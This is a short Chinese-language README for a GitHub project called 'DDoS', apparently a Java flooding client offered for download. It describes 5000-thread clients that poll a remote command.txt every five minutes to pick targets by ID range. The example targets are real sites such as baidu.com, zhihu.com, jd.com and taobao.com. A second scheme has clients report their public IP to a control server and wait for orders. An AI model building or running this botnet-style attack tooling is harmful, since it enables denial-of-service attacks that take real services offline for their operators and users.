运行环境:>=1.8

运行run.bat

下载地址:https://github.com/102400/DDoS/archive/master.zip

线程:5000
command.txt:https://github.com/102400/DDoS/raw/master/command.txt
周期:1000*60*5 ms

线程越多,停止的速度越慢

方案1
  1.创建id,由 id.txt 决定是 随机id 还是 指定id id范围0-999
  2.每隔几分钟从 网络 上读取一个 文本(command.txt) 识别自身应该执行的命令 并执行

start    //只有start才会执行下去
0-399:http://www.baidu.com;    //在0-399范围的id目标为 http://www.baidu.com  如果客户端的id均为随机并且客户端足够多则约40%的客户端目标为此
500:http://www.zhihu.com;    //500的id目标为 http://www.zhihu.com  约0.1%的客户端目标为此
501:http://www.douban.com;
502:http://www.mtime.com;
503:http://www.mi.com;
504:http://www.jd.com;
600-799:http://www.alibaba.com;
800-899:http://www.taobao.com;
900-959:http://www.so.com;
default:http://www.baidu.com;    //除了上面之外默认的操作 可以填 目标 或者 stop;
//结尾必须加 ;

  
方案2
  客户端 先发送自身公网ip到 服务端 再监听端口等待服务端发送的命令
  
  
https://github.com/102400/DDoS